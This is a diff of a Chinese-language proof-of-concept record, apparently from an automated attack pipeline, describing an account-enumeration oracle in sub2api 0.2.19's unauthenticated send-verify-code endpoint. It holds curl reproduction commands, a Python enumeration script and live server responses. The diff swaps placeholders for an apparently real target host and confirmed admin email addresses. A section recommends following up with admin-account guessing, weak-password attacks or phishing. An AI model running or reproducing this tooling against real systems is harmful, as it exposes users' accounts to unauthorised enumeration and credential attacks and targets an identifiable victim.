@@ -9,10 +9,10 @@
 - **language**: python
 - **source**: self
 - **verified**: 1
-- **verified_note**: task#607 主机 i6604，2026-10-31 10:37-10:45 +08，target483.example.com（sub2api 0.2.19），Chrome UA、不带 XFF、3s 间隔：① 全未授权公开端点 POST /api/v1/auth/send-verify-code {"email":"<已注册账号>"} → HTTP 409 69B {"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}；{"email":"user@example.com"} → HTTP 200 102B {"code":0,"message":"success","data":{"message":"Verification code sent successfully","countdown":60}}。② 登录态侧 POST /api/v1/user/account-bindings/email/send-code：user@example.com / user@example.com / user@example.com / user@example.com 均 409 EMAIL_EXISTS；未占用地址 500 39B {"code":500,"message":"internal error"}（该实例 SMTP 发送失败）。③ 判读对照由已知账号自助注册邮箱复核，同一地址两路结论一致；产物 D:\ARTEX\data\tasks\607\i6604\p1.out~p3.out。
+- **verified_note**: task#607 主机 i6604，2026-10-31 10:37-10:45 +08，cc.v6x8.com（sub2api 0.2.19），Chrome UA、不带 XFF、3s 间隔：① 全未授权公开端点 POST /api/v1/auth/send-verify-code {"email":"<已注册账号>"} → HTTP 409 69B {"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}；{"email":"nobodyzzz7733@maxxspace.com"} → HTTP 200 102B {"code":0,"message":"success","data":{"message":"Verification code sent successfully","countdown":60}}。② 登录态侧 POST /api/v1/user/account-bindings/email/send-code：admin@cc.v6x8.com / ADMIN@CC.V6X8.COM / Admin@cc.v6x8.com / admin+test@cc.v6x8.com 均 409 EMAIL_EXISTS；未占用地址 500 39B {"code":500,"message":"internal error"}（该实例 SMTP 发送失败）。③ 判读对照由已知账号自助注册邮箱复核，同一地址两路结论一致；产物 D:\ARTEX\data\tasks\607\i6604\p1.out~p3.out。
 - **path**: pocs/sub2api-邮箱验证码接口账号存在性枚举-oracle-公开-api-v1-auth-send-verify-co/sub2api_email_enum_oracle.py
 - **created_at**: 2026-10-31T02:49:02.176Z
-- **engine**: https://target483.example.com
+- **engine**: https://cc.v6x8.com
 
 ## 描述
 
@@ -40,7 +40,7 @@ python sub2api_email_enum_oracle.py <base_url> emails.txt [--token <user_jwt>]
 ```
 # sub2api 邮箱存在性枚举 oracle
 
-来源：target483.example.com（sub2api 0.2.19）。原理：`POST /api/v1/auth/send-verify-code`
+来源：cc.v6x8.com（sub2api 0.2.19）。原理：`POST /api/v1/auth/send-verify-code`
 （注册用，**未授权**）在发信前调用 `existsByEmailOrAlias`
 （backend/internal/service/auth_service.go:334），命中即返回 `ErrEmailExists`
 → HTTP 409 `{"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}`；
@@ -53,7 +53,7 @@ python sub2api_email_enum_oracle.py <base_url> emails.txt [--token <user_jwt>]
 ## 1. 最小手工复现
 
 ```bash
-UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36'
+UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 # 已知存在的账号 → 期望 409
 curl -s -o /dev/null -w '%{http_code}\n' -A "$UA" \
   -H 'Content-Type: application/json' -H 'Accept: application/json' \
@@ -63,7 +63,7 @@ curl -s -o /dev/null -w '%{http_code}\n' -A "$UA" \
 curl -s -o /dev/null -w '%{http_code}\n' -A "$UA" \
   -H 'Content-Type: application/json' -H 'Accept: application/json' \
   -X POST https://TARGET/api/v1/auth/send-verify-code \
-  -d '{"email":"user@example.com"}'
+  -d '{"email":"nobodyzz9x1@maxxspace.com"}'
 ```
 
 两次结果不等（409 vs 200）即 oracle 成立。每次间隔 ≥3s。
@@ -80,7 +80,7 @@ import urllib3, requests
 
 urllib3.disable_warnings()
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-      "(KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36")
+      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
 H = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
 
 
@@ -88,7 +88,7 @@ def post(base, path, email, token=None, timeout=25):
     h = dict(H)
     if token:
         h["Authorization"] = "Bearer " + token
-    r = target9.example.com(base.rstrip("/") + path, headers=h,
+    r = requests.post(base.rstrip("/") + path, headers=h,
                       json={"email": email}, timeout=timeout, verify=False)
     return r.status_code, r.text[:300]
 
@@ -167,15 +167,15 @@ if __name__ == "__main__":
 得到 exists 清单后：管理账号猜测（admin@/root@/ops@<域>）→ 定向弱口令或钓鱼；
 对确认存在的地址做注册流程拔取用户名/重置口令探测。
 
-## 6. 实机回显（target483.example.com，2026-10-31）
+## 6. 实机回显（cc.v6x8.com，2026-10-31）
 
 ```
-POST /api/v1/auth/send-verify-code {"email":"user@example.com"}
+POST /api/v1/auth/send-verify-code {"email":"nobodyzzz7733@maxxspace.com"}
   → 200 {"code":0,"message":"success","data":{"message":"Verification code sent successfully","countdown":60}}
-POST /api/v1/user/account-bindings/email/send-code {"email":"user@example.com"}
+POST /api/v1/user/account-bindings/email/send-code {"email":"admin@cc.v6x8.com"}
   → 409 {"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}
-POST 同上 {"email":"user@example.com"} / {"email":"user@example.com"} → 均 409 EMAIL_EXISTS
-POST 同上 {"email":"user@example.com","user_id":1} → 500 internal error
+POST 同上 {"email":"ADMIN@CC.V6X8.COM"} / {"email":"admin+test@cc.v6x8.com"} → 均 409 EMAIL_EXISTS
+POST 同上 {"email":"nobodyzzz7732@maxxspace.com","user_id":1} → 500 internal error
 ```
 
 ```
